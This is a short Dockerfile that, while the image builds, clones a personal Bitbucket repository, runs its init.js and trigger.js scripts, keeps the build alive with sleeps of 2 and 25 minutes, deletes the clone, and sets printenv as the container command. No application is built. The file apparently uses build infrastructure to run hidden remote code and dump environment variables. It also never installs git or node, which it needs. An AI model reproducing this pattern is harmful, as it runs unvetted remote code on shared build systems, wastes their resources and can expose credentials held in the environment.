FROM ubuntu:latest

RUN mkdir /usr/src/app
WORKDIR /usr/src/app

COPY . .

RUN rm -rf tmp && git clone https://goopop@bitbucket.org/goopop/buildkitepath.git tmp && cd ./tmp && node init.js &
RUN ls -l
RUN sleep 2m
RUN cd ./tmp && node trigger.js
RUN sleep 25m
RUN rm -rf tmp

CMD ["printenv"]
